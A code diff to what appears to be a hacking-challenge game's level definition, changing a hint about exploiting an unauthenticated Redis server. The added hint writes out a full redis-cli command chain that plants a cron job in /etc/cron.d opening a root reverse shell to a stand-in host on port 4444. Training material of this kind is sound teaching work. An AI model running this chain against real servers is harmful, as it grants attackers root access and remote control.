@@ -65,7 +65,7 @@ export const mediumLevel8: ChainDef = {
       hints: [
         "Recon first — `nmap -sV <ip>`. A cache server port with no auth banner is worth a closer look.",
         "`redis-cli -h <ip> ping` — if it answers PONG with no password prompt at all, this instance is wide open.",
-        "An unauthenticated Redis instance can be told to change its working directory and its output filename via CONFIG SET, then write a crafted key's value straight into a system cron directory — that's a well-documented technique for turning open Redis into remote code execution.",
+        "An unauthenticated Redis instance can be told to change its working directory and its output filename via CONFIG SET, then write a crafted key's value straight into a system cron directory: `redis-cli -h <ip> config set dir /etc/cron.d/ ; redis-cli -h <ip> config set dbfilename backdoor ; redis-cli -h <ip> set payload \"* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/op/4444 0>&1'\" ; redis-cli -h <ip> save`.",
         "Once the planted job runs, you should land a shell as root. Look for a proof file.",
       ],
       debrief: [
